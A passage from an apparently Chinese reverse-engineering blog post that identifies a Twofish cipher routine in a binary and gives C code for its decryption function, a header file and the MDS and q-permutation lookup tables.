class="number">0x6b</span>,<span class="number">0x45</span>,<span class="number">0x7d</span>,<span class="number">0xe8</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x32</span>,<span class="number">0xd8</span>,<span class="number">0xfd</span>,<span class="number">0x37</span>,<span class="number">0x71</span>,<span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x30</span>,<span class="number">0xf</span>,<span class="number">0xf8</span>,<span class="number">0x1b</span>,<span class="number">0x87</span>,<span class="number">0xfa</span>,<span class="number">0x6</span>,<span class="number">0x3f</span>,</span><br><span class="line"><span class="number">0x5e</span>,<span class="number">0xba</span>,<span class="number">0xae</span>,<span class="number">0x5b</span>,<span class="number">0x8a</span>,<span class="number">0x0</span>,<span class="number">0xbc</span>,<span class="number">0x9d</span>,<span class="number">0x6d</span>,<span class="number">0xc1</span>,<span class="number">0xb1</span>,<span class="number">0xe</span>,<span class="number">0x80</span>,<span class="number">0x5d</span>,<span class="number">0xd2</span>,<span class="number">0xd5</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0x84</span>,<span class="number">0x7</span>,<span class="number">0x14</span>,<span class="number">0xb5</span>,<span class="number">0x90</span>,<span class="number">0x2c</span>,<span class="number">0xa3</span>,<span class="number">0xb2</span>,<span class="number">0x73</span>,<span class="number">0x4c</span>,<span class="number">0x54</span>,<span class="number">0x92</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x38</span>,<span class="number">0xb0</span>,<span class="number">0xbd</span>,<span class="number">0x5a</span>,<span class="number">0xfc</span>,<span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x96</span>,<span class="number">0x6c</span>,<span class="number">0x42</span>,<span class="number">0xf7</span>,<span class="number">0x10</span>,<span class="number">0x7c</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x8c</span>,</span><br><span class="line"><span class="number">0x13</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0xc7</span>,<span class="number">0x24</span>,<span class="number">0x46</span>,<span class="number">0x3b</span>,<span class="number">0x70</span>,<span class="number">0xca</span>,<span class="number">0xe3</span>,<span class="number">0x85</span>,<span class="number">0xcb</span>,<span class="number">0x11</span>,<span class="number">0xd0</span>,<span class="number">0x93</span>,<span class="number">0xb8</span>,</span><br><span class="line"><span class="number">0xa6</span>,<span class="number">0x83</span>,<span class="number">0x20</span>,<span class="number">0xff</span>,<span class="number">0x9f</span>,<span class="number">0x77</span>,<span class="number">0xc3</span>,<span class="number">0xcc</span>,<span class="number">0x3</span>,<span class="number">0x6f</span>,<span class="number">0x8</span>,<span class="number">0xbf</span>,<span class="number">0x40</span>,<span class="number">0xe7</span>,<span class="number">0x2b</span>,<span class="number">0xe2</span>,</span><br><span class="line"><span class="number">0x79</span>,<span class="number">0xc</span>,<span class="number">0xaa</span>,<span class="number">0x82</span>,<span class="number">0x41</span>,<span class="number">0x3a</span>,<span class="number">0xea</span>,<span class="number">0xb9</span>,<span class="number">0xe4</span>,<span class="number">0x9a</span>,<span class="number">0xa4</span>,<span class="number">0x97</span>,<span class="number">0x7e</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x66</span>,<span class="number">0x94</span>,<span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0x3d</span>,<span class="number">0xf0</span>,<span class="number">0xde</span>,<span class="number">0xb3</span>,<span class="number">0xb</span>,<span class="number">0x72</span>,<span class="number">0xa7</span>,<span class="number">0x1c</span>,<span class="number">0xef</span>,<span class="number">0xd1</span>,<span class="number">0x53</span>,<span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0x8f</span>,<span class="number">0x33</span>,<span class="number">0x26</span>,<span class="number">0x5f</span>,<span class="number">0xec</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0x49</span>,<span class="number">0x81</span>,<span class="number">0x88</span>,<span class="number">0xee</span>,<span class="number">0x21</span>,<span class="number">0xc4</span>,<span class="number">0x1a</span>,<span class="number">0xeb</span>,<span class="number">0xd9</span>,</span><br><span class="line"><span class="number">0xc5</span>,<span class="number">0x39</span>,<span class="number">0x99</span>,<span class="number">0xcd</span>,<span class="number">0xad</span>,<span class="number">0x31</span>,<span class="number">0x8b</span>,<span class="number">0x1</span>,<span class="number">0x18</span>,<span class="number">0x23</span>,<span class="number">0xdd</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0x2d</span>,<span class="number">0xf9</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x4f</span>,<span class="number">0xf2</span>,<span class="number">0x65</span>,<span class="number">0x8e</span>,<span class="number">0x78</span>,<span class="number">0x5c</span>,<span class="number">0x58</span>,<span class="number">0x19</span>,<span class="number">0x8d</span>,<span class="number">0xe5</span>,<span class="number">0x98</span>,<span class="number">0x57</span>,<span class="number">0x67</span>,<span class="number">0x7f</span>,<span class="number">0x5</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0xaf</span>,<span class="number">0x63</span>,<span class="number">0xb6</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xb7</span>,<span class="number">0x3c</span>,<span class="number">0xa5</span>,<span class="number">0xce</span>,<span class="number">0xe9</span>,<span class="number">0x68</span>,<span class="number">0x44</span>,<span class="number">0xe0</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x2e</span>,<span class="number">0xac</span>,<span class="number">0x15</span>,<span class="number">0x59</span>,<span class="number">0xa8</span>,<span class="number">0xa</span>,<span class="number">0x9e</span>,<span class="number">0x6e</span>,<span class="number">0x47</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0xcf</span>,<span class="number">0xdc</span>,</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0xc9</span>,<span class="number">0xc0</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0xd4</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0x12</span>,<span class="number">0xa2</span>,<span class="number">0xd</span>,<span class="number">0x52</span>,<span class="number">0xbb</span>,<span class="number">0x2</span>,<span class="number">0x2f</span>,<span class="number">0xa9</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0x61</span>,<span class="number">0x1e</span>,<span class="number">0xb4</span>,<span class="number">0x50</span>,<span class="number">0x4</span>,<span class="number">0xf6</span>,<span class="number">0xc2</span>,<span class="number">0x16</span>,<span class="number">0x25</span>,<span class="number">0x86</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x9</span>,<span class="number">0xbe</span>,<span class="number">0x91</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>MDS矩阵运算<br><img src="https://i.loli.net/2019/07/25/5d39335e7c98176996.jpg" alt></p><blockquote><p>S-box生成</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d3933a271f7034024.jpg" alt></p><blockquote><p>输入白化，循环，输出白化  sub_401626</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d39363aca3b346223.jpg" alt></p><p>c实现<br><img src="https://i.loli.net/2019/07/25/5d393666d494e15914.jpg" alt></p><p>f函数<br><img src="https://i.loli.net/2019/07/25/5d39463d2a01720818.jpg" alt></p><h2 id="算法解密"><a href="#算法解密" class="headerlink" title="算法解密"></a>算法解密</h2><p>解密函数如下<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^pack(cypher);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^pack(cypher+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^pack(cypher+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^pack(cypher+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">15</span>; i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = (rol(r2,<span class="number">1</span>)^f0);</span><br><span class="line">        c3 = ror((f1^r3),<span class="number">1</span>);</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^c3;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i]   = unpack(r0,i);</span><br><span class="line">        data[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        data[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        data[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此TwoFish加解密代码如下</p><p>twofish.h<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __TWOFISH__H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __TWOFISH__H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdint.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TWOFISH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  TWOFISH</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">twofish_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> s[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125;<span class="keyword">twofish_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish MDS Multiply Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   data</span></span><br><span class="line"><span class="comment"> * @param   cypher</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_encryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *data, <span class="keyword">uint8_t</span> *cypher)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Decryption Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @paramtf_twofish</span></span><br><span class="line"><span class="comment"> * @param   cypher</span></span><br><span class="line"><span class="comment"> * @param   data</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span class="keyword">uint8_t</span> *data)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Setup Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   len</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">twofish_t</span>*  Twofish_setup(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>tables.h</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">ifndef</span> __TABLES__H</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> __TABLES__H</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* The MDS Matrix */</span></span><br><span class="line"> <span class="keyword">uint8_t</span> mds[<span class="number">4</span>][<span class="number">4</span>]=</span><br><span class="line"> &#123;</span><br><span class="line">    &#123;<span class="number">0x01</span>, <span class="number">0xef</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x5b</span>, <span class="number">0xef</span>, <span class="number">0xef</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xef</span>, <span class="number">0x5b</span>, <span class="number">0x01</span>, <span class="number">0xef</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xef</span>, <span class="number">0x01</span>, <span class="number">0xef</span>, <span class="number">0x5b</span>&#125;</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">uint8_t</span> q[<span class="number">2</span>][<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* q0 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line"><span class="number">0xa9</span>,<span class="number">0x67</span>,<span class="number">0xb3</span>,<span class="number">0xe8</span>,<span class="number">0x4</span>,<span class="number">0xfd</span>,<span class="number">0xa3</span>,<span class="number">0x76</span>,<span class="number">0x9a</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x78</span>,<span class="number">0xe4</span>,<span class="number">0xdd</span>,<span class="number">0xd1</span>,<span class="number">0x38</span>,</span><br><span class="line"><span class="number">0xd</span>,<span class="number">0xc6</span>,<span class="number">0x35</span>,<span class="number">0x98</span>,<span class="number">0x18</span>,<span class="number">0xf7</span>,<span class="number">0xec</span>,<span class="number">0x6c</span>,<span class="number">0x43</span>,<span class="number">0x75</span>,<span class="number">0x37</span>,<span class="number">0x26</span>,<span class="number">0xfa</span>,<span class="number">0x13</span>,<span class="number">0x94</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0xd0</span>,<span class="number">0x8b</span>,<span class="number">0x30</span>,<span class="number">0x84</span>,<span class="number">0x54</span>,<span class="number">0xdf</span>,<span class="number">0x23</span>,<span class="number">0x19</span>,<span class="number">0x5b</span>,<span class="number">0x3d</span>,<span class="number">0x59</span>,<span class="number">0xf3</span>,<span class="number">0xae</span>,<span class="number">0xa2</span>,<span class="number">0x82</span>,</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x1</span>,<span class="number">0x83</span>,<span class="number">0x2e</span>,<span class="number">0xd9</span>,<span class="number">0x51</span>,<span class="number">0x9b</span>,<span class="number">0x7c</span>,<span class="number">0xa6</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0xbe</span>,<span class="number">0x16</span>,<span class="number">0xc</span>,<span class="number">0xe3</span>,<span class="number">0x61</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0x8c</span>,<span class="number">0x3a</span>,<span class="number">0xf5</span>,<span class="number">0x73</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0xb</span>,<span class="number">0xbb</span>,<span class="number">0x4e</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x6a</span>,<span class="number">0xb4</span>,<span class="number">0xf1</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xe6</span>,<span class="number">0xbd</span>,<span class="number">0x45</span>,<span class="number">0xe2</span>,<span class="number">0xf4</span>,<span class="number">0xb6</span>,<span class="number">0x66</span>,<span class="number">0xcc</span>,<span class="number">0x95</span>,<span class="number">0x3</span>,<span class="number">0x56</span>,<span class="number">0xd4</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,<span class="number">0xd7</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0xc3</span>,<span class="number">0x8e</span>,<span class="number">0xb5</span>,<span class="number">0xe9</span>,<span class="number">0xcf</span>,<span class="number">0xbf</span>,<span class="number">0xba</span>,<span class="number">0xea</span>,<span class="number">0x77</span>,<span class="number">0x39</span>,<span class="number">0xaf</span>,<span class="number">0x33</span>,<span class="number">0xc9</span>,<span class="number">0x62</span>,<span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x79</span>,<span class="number">0x9</span>,<span class="number">0xad</span>,<span class="number">0x24</span>,<span class="number">0xcd</span>,<span class="number">0xf9</span>,<span class="number">0xd8</span>,<span class="number">0xe5</span>,<span class="number">0xc5</span>,<span class="number">0xb9</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x8</span>,<span class="number">0x86</span>,<span class="number">0xe7</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0xaa</span>,<span class="number">0xed</span>,<span class="number">0x6</span>,<span class="number">0x70</span>,<span class="number">0xb2</span>,<span class="number">0xd2</span>,<span class="number">0x41</span>,<span class="number">0x7b</span>,<span class="number">0xa0</span>,<span class="number">0x11</span>,<span class="number">0x31</span>,<span class="number">0xc2</span>,<span class="number">0x27</span>,<span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0xf6</span>,<span class="number">0x60</span>,<span class="number">0xff</span>,<span class="number">0x96</span>,<span class="number">0x5c</span>,<span class="number">0xb1</span>,<span class="number">0xab</span>,<span class="number">0x9e</span>,<span class="number">0x9c</span>,<span class="number">0x52</span>,<span class="number">0x1b</span>,<span class="number">0x5f</span>,<span class="number">0x93</span>,<span class="number">0xa</span>,<span class="number">0xef</span>,</span><br><span class="line"><span class="number">0x91</span>,<span class="number">0x85</span>,<span class="number">0x49</span>,<span class="number">0xee</span>,<span class="number">0x2d</span>,<span class="number">0x4f</span>,<span class="number">0x8f</span>,<span class="number">0x3b</span>,<span class="number">0x47</span>,<span class="number">0x87</span>,<span class="number">0x6d</span>,<span class="number">0x46</span>,<span class="number">0xd6</span>,<span class="number">0x3e</span>,<span class="number">0x69</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0xce</span>,<span class="number">0xcb</span>,<span class="number">0x2f</span>,<span class="number">0xfc</span>,<span class="number">0x97</span>,<span class="number">0x5</span>,<span class="number">0x7a</span>,<span class="number">0xac</span>,<span class="number">0x7f</span>,<span class="number">0xd5</span>,<span class="number">0x1a</span>,<span class="number">0x4b</span>,<span class="number">0xe</span>,<span class="number">0xa7</span>,<span class="number">0x5a</span>,</span><br><span class="line"><span class="number">0x28</span>,<span class="number">0x14</span>,<span class="number">0x3f</span>,<span class="number">0x29</span>,<span class="number">0x88</span>,<span class="number">0x3c</span>,<span class="number">0x4c</span>,<span class="number">0x2</span>,<span class="number">0xb8</span>,<span class="number">0xda</span>,<span class="number">0xb0</span>,<span class="number">0x17</span>,<span class="number">0x55</span>,<span class="number">0x1f</span>,<span class="number">0x8a</span>,<span class="number">0x7d</span>,</span><br><span class="line"><span class="number">0x57</span>,<span class="number">0xc7</span>,<span class="number">0x8d</span>,<span class="number">0x74</span>,<span class="number">0xb7</span>,<span class="number">0xc4</span>,<span class="number">0x9f</span>,<span class="number">0x72</span>,<span class="number">0x7e</span>,<span class="number">0x15</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x58</span>,<span class="number">0x7</span>,<span class="number">0x99</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x6e</span>,<span class="number">0x50</span>,<span class="number">0xde</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0xbc</span>,<span class="number">0xdb</span>,<span class="number">0xf8</span>,<span class="number">0xc8</span>,<span class="number">0xa8</span>,<span class="number">0x2b</span>,<span class="number">0x40</span>,<span class="number">0xdc</span>,<span class="number">0xfe</span>,<span class="number">0x32</span>,<span class="number">0xa4</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x10</span>,<span class="number">0x21</span>,<span class="number">0xf0</span>,<span class="number">0xd3</span>,<span class="number">0x5d</span>,<span class="number">0xf</span>,<span class="number">0x0</span>,<span class="number">0x6f</span>,<span class="number">0x9d</span>,<span class="number">0x36</span>,<span class="number">0x42</span>,<span class="number">0x4a</span>,<span class="number">0x5e</span>,<span class="number">0xc1</span>,<span class="number">0xe0</span></span><br><span class="line">&#125;,</span><br><span class="line">    <span class="comment">/* q1 */</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x75</span>,<span class="number">0xf3</span>,<span class="number">0xc6</span>,<span class="number">0xf4</span>,<span class="number">0xdb</span>,<span class="number">0x7b</span>,<span class="number">0xfb</span>,<span class="number">0xc8</span>,<span class="number">0x4a</span>,<span class="number">0xd3</span>,<span class="number">0xe6</span>,<span class="number">0x6b</span>,<span class="number">0x45</span>,<span class="number">0x7d</span>,<span class="number">0xe8</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x32</span>,<span class="number">0xd8</span>,<span class="number">0xfd</span>,<span class="number">0x37</span>,<span class="number">0x71</span>,<span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x30</span>,<span class="number">0xf</span>,<span class="number">0xf8</span>,<span class="number">0x1b</span>,<span class="number">0x87</span>,<span class="number">0xfa</span>,<span class="number">0x6</span>,<span class="number">0x3f</span>,</span><br><span class="line"><span class="number">0x5e</span>,<span class="number">0xba</span>,<span class="number">0xae</span>,<span class="number">0x5b</span>,<span class="number">0x8a</span>,<span class="number">0x0</span>,<span class="number">0xbc</span>,<span class="number">0x9d</span>,<span class="number">0x6d</span>,<span class="number">0xc1</span>,<span class="number">0xb1</span>,<span class="number">0xe</span>,<span class="number">0x80</span>,<span class="number">0x5d</span>,<span class="number">0xd2</span>,<span class="number">0xd5</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0x84</span>,<span class="number">0x7</span>,<span class="number">0x14</span>,<span class="number">0xb5</span>,<span class="number">0x90</span>,<span class="number">0x2c</span>,<span class="number">0xa3</span>,<span class="number">0xb2</span>,<span class="number">0x73</span>,<span class="number">0x4c</span>,<span class="number">0x54</span>,<span class="number">0x92</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x38</span>,<span class="number">0xb0</span>,<span class="number">0xbd</span>,<span class="number">0x5a</span>,<span class="number">0xfc</span>,<span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x96</span>,<span class="number">0x6c</span>,<span class="number">0x42</span>,<span class="number">0xf7</span>,<span class="number">0x10</span>,<span class="number">0x7c</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x8c</span>,</span><br><span class="line"><span class="number">0x13</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0xc7</span>,<span class="number">0x24</span>,<span class="number">0x46</span>,<span class="number">0x3b</span>,<span class="number">0x70</span>,<span class="number">0xca</span>,<span class="number">0xe3</span>,<span class="number">0x85</span>,<span class="number">0xcb</span>,<span class="number">0x11</span>,<span class="number">0xd0</span>,<span class="number">0x93</span>,<span class="number">0xb8</span>,</span><br><span class="line"><span class="number">0xa6</span>,<span class="number">0x83</span>,<span class="number">0x20</span>,<span class="number">0xff</span>,<span class="number">0x9f</span>,<span class="number">0x77</span>,<span class="number">0xc3</span>,<span class="number">0xcc</span>,<span class="number">0x3</span>,<span class="number">0x6f</span>,<span class="number">0x8</span>,<span class="number">0xbf</span>,<span class="number">0x40</span>,<span class="number">0xe7</span>,<span class="number">0x2b</span>,<span class="number">0xe2</span>,</span><br><span class="line"><span class="number">0x79</span>,<span class="number">0xc</span>,<span class="number">0xaa</span>,<span class="number">0x82</span>,<span class="number">0x41</span>,<span class="number">0x3a</span>,<span class="number">0xea</span>,<span class="number">0xb9</span>,<span class="number">0xe4</span>,<span class="number">0x9a</span>,<span class="number">0xa4</span>,<span class="number">0x97</span>,<span class="number">0x7e</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x66</span>,<span class="number">0x94</span>,<span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0x3d</span>,<span class="number">0xf0</span>,<span class="number">0xde</span>,<span class="number">0xb3</span>,<span class="number">0xb</span>,<span class="number">0x72</span>,<span class="number">0xa7</span>,<span class="number">0x1c</span>,<span class="number">0xef</span>,<span class="number">0xd1</span>,<span class="number">0x53</span>,<span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0x8f</span>,<span class="number">0x33</span>,<span class="number">0x26</span>,<span class="number">0x5f</span>,<span class="number">0xec</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0x49</span>,<span class="number">0x81</span>,<span class="number">0x88</span>,<span class="number">0xee</span>,<span class="number">0x21</span>,<span class="number">0xc4</span>,<span class="number">0x1a</span>,<span class="number">0xeb</span>,<span class="number">0xd9</span>,</span><br><span class="line"><span class="number">0xc5</span>,<span class="number">0x39</span>,<span class="number">0x99</span>,<span class="number">0xcd</span>,<span class="number">0xad</span>,<span class="number">0x31</span>,<span class="number">0x8b</span>,<span class="number">0x1</span>,<span class="number">0x18</span>,<span class="number">0x23</span>,<span class="number">0xdd</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0x2d</span>,<span class="number">0xf9</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x4f</span>,<span class="number">0xf2</span>,<span class="number">0x65</span>,<span class="number">0x8e</span>,<span class="number">0x78</span>,<span class="number">0x5c</span>,<span class="number">0x58</span>,<span class="number">0x19</span>,<span class="number">0x8d</span>,<span class="number">0xe5</span>,<span class="number">0x98</span>,<span class="number">0x57</span>,<span class="number">0x67</span>,<span class="number">0x7f</span>,<span class="number">0x5</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0xaf</span>,<span class="number">0x63</span>,<span class="number">0xb6</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xb7</span>,<span class="number">0x3c</span>,<span class="number">0xa5</span>,<span class="number">0xce</span>,<span class="number">0xe9</span>,<span class="number">0x68</span>,<span class="number">0x44</span>,<span class="number">0xe0</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x2e</span>,<span class="number">0xac</span>,<span class="number">0x15</span>,<span class="number">0x59</span>,<span class="number">0xa8</span>,<span class="number">0xa</span>,<span class="number">0x9e</span>,<span class="number">0x6e</span>,<span class="number">0x47</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0xcf</span>,<span class="number">0xdc</span>,</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0xc9</span>,<span class="number">0xc0</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0xd4</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0x12</span>,<span class="number">0xa2</span>,<span class="number">0xd</span>,<span class="number">0x52</span>,<span class="number">0xbb</span>,<span class="number">0x2</span>,<span class="number">0x2f</span>,<span class="number">0xa9</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0x61</span>,<span class="number">0x1e</span>,<span class="number">0xb4</span>,<span class="number">0x50</span>,<span class="number">0x4</span>,<span class="number">0xf6</span>,<span class="number">0xc2</span>,<span class="number">0x16</span>,<span class="number">0x25</span>,<span class="number">0x86</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x9</span>,<span class="number">0xbe</span>,<span class="number">0x91</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>twofish.c<br><figure class="highlight 